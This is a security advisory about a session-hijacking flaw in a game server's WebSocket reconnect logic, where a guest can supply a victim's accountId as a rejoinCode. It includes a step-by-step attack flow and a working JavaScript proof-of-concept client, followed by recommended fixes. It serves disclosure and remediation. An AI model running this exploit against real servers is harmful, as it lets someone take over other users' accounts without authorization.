# Critical Security Vulnerability: Session Hijacking via Reconnect System

## Summary

A critical authentication bypass vulnerability exists in the player reconnection system that allows an attacker to hijack any logged-in user's active session using only their MongoDB `accountId` (which is not a secret).

## Severity

**CRITICAL** - Complete session takeover, no secret/password required

## Affected File

`ws/classes/Player.js` - `verify()` function

## Vulnerability Details

### Root Cause

The `disconnectedPlayers` map uses two different types of keys depending on whether the user is logged in or a guest:

**Line 382:**
```javascript
disconnectedPlayers.set(this.accountId||this.rejoinCode, this.id);
```

- For **logged-in users**: key = `accountId` (MongoDB `_id`, e.g., `"507f1f77bcf86cd799439011"`)
- For **guests**: key = `rejoinCode` (secure UUID, e.g., `"a1b2c3d4-e5f6-7890-abcd-ef1234567890"`)

However, the guest reconnection path at **lines 164-169** accepts any user-provided `rejoinCode` without validating its format:

```javascript
if(json.rejoinCode) {
  const dcPlayerId = disconnectedPlayers.get(json.rejoinCode);
  if(dcPlayerId) {
    handleReconnect(dcPlayerId, json.rejoinCode);
    return;
  }
}
```

Since both key types are stored in the same map, an attacker can provide a victim's `accountId` as their `rejoinCode` and hijack their session.

### Attack Flow

```
1. Victim (logged-in user) connects to the game
   → Server creates Player with accountId = "507f1f77bcf86cd799439011"

2. Victim disconnects (network issue, closes tab, etc.)
   → Server executes: disconnectedPlayers.set("507f1f77bcf86cd799439011", victimPlayerId)

3. Attacker connects as GUEST (no secret)
   → Sends: { type: "verify", secret: "not_logged_in", rejoinCode: "507f1f77bcf86cd799439011" }

4. Server processes guest reconnection (lines 164-169):
   → disconnectedPlayers.get("507f1f77bcf86cd799439011") returns victimPlayerId
   → handleReconnect() is called
   → Attacker's websocket is assigned to victim's Player object

5. Attacker now controls victim's session:
   - Has victim's username
   - Has victim's ELO rating
   - Has victim's friends list
   - Can play ranked games as victim
   - Can perform any action as victim
```

### Why accountId is Not Secret

MongoDB `_id` values can be leaked through:
- API responses (friend lists, leaderboards, game results)
- Browser network inspection
- The `_id` format is predictable (ObjectId contains timestamp + counter)
- Social engineering

## Proof of Concept

```javascript
// Attacker's malicious client code
const ws = new WebSocket("wss://game-server-url");

ws.onopen = () => {
  // Send verify as guest, but with victim's accountId as rejoinCode
  ws.send(JSON.stringify({
    type: "verify",
    secret: "not_logged_in",
    rejoinCode: "VICTIM_ACCOUNT_ID_HERE"  // e.g., "507f1f77bcf86cd799439011"
  }));
};

ws.onmessage = (msg) => {
  const data = JSON.parse(msg.data);
  if (data.type === "verify") {
    console.log("Successfully hijacked session!");
    // Attacker is now playing as victim
  }
};
```

## Impact

- **Complete account takeover** for any user who disconnects
- **ELO manipulation** - attacker can intentionally lose games to tank victim's rating
- **Reputation damage** - attacker can send offensive messages as victim
- **Friend list access** - attacker sees victim's friends, can remove friends
- **No trace** - victim may not realize their session was hijacked

## Recommended Fix

### Option 1: Always Use Secure rejoinCode (Recommended)

Change line 382 to always use the UUID-based `rejoinCode`:

```javascript
// Before (VULNERABLE):
disconnectedPlayers.set(this.accountId||this.rejoinCode, this.id);

// After (FIXED):
disconnectedPlayers.set(this.rejoinCode, this.id);
```

Also update line 196 to look up by `rejoinCode` instead of `accountId`, and send `rejoinCode` to logged-in users in the verify response (line 266-268):

```javascript
this.send({
  type: 'verify',
  rejoinCode: this.rejoinCode  // Add this
});
```

And validate that reconnecting session belongs to the same account:

```javascript
// Line 196-199 updated:
if(json.rejoinCode) {
  const dcPlayerId = disconnectedPlayers.get(json.rejoinCode);
  if(dcPlayerId) {
    const dcPlayer = players.get(dcPlayerId);
    // Verify the session belongs to this account
    if(dcPlayer && dcPlayer.accountId === valid._id.toString()) {
      await handleReconnect(dcPlayerId, json.rejoinCode, valid._id.toString());
      return;
    }
  }
}
```

### Option 2: Namespace the Keys

Prefix keys to prevent collision:

```javascript
// Line 382:
const key = this.accountId ? `account:${this.accountId}` : `guest:${this.rejoinCode}`;
disconnectedPlayers.set(key, this.id);

// Line 165 (guest path):
const dcPlayerId = disconnectedPlayers.get(`guest:${json.rejoinCode}`);

// Line 196 (logged-in path):
const dcPlayerId = disconnectedPlayers.get(`account:${valid._id.toString()}`);
```

### Option 3: Validate rejoinCode Format

Add validation to ensure guest rejoinCodes are UUIDs:

```javascript
// Line 164-169:
if(json.rejoinCode) {
  // UUID v4 format check
  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  if(uuidRegex.test(json.rejoinCode)) {
    const dcPlayerId = disconnectedPlayers.get(json.rejoinCode);
    // ... rest of reconnection logic
  }
}
```

## Timeline

- **Discovered:** 2026-02-01
- **Status:** Unfixed

## Additional Notes

The secure `rejoinCode` UUID is already being generated for every player at line 34:

```javascript
this.rejoinCode = createUUID();
```

It's just not being used for logged-in users, making this a relatively easy fix.
